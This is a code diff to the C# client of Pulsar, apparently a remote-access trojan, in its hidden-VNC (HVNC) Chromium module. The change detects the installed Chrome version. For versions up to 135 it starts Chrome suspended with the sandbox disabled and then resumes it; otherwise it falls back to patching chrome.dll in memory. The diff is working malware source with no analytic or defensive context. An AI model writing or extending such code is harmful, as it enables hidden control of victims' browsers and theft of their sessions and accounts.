@@ -5,6 +5,7 @@ using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace Pulsar.Client.Helper.HVNC.Chromium
@@ -276,6 +277,29 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
         /// </summary>
         public void Start()
         {
+            // Get the version folder name (e.g., "123.0.6312.86")
+            string versionFolderName = Path.GetFileName(ChromiumInstallFolderPath);
+            int majorVersion = 0;
+            if (!string.IsNullOrEmpty(versionFolderName))
+            {
+                var parts = versionFolderName.Split('.');
+                if (parts.Length > 0)
+                    int.TryParse(parts[0], out majorVersion);
+            }
+
+            Debug.WriteLine($"> Detected Chrome version: {versionFolderName} (major version: {majorVersion})");
+
+            if (majorVersion > 0 && majorVersion <= 135)
+            {
+                // No patch needed, just start Chrome normally
+                Debug.WriteLine($"> Chrome version {majorVersion} detected, skipping patch.");
+                int goodVerPID = ProcessHelper.CreateSuspendedProcess(ChromiumExePath, "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized");
+                Thread.Sleep(500);
+                ProcessHelper.ResumeProcess(goodVerPID);
+                return;
+            }
+
+            // Patch logic as before
             byte[] chromeDll = ReadChromeDll();
             Debug.WriteLine("> Read {0} bytes from chrome.dll", chromeDll.Length);
             if (chromeDll.Length == 0) return;
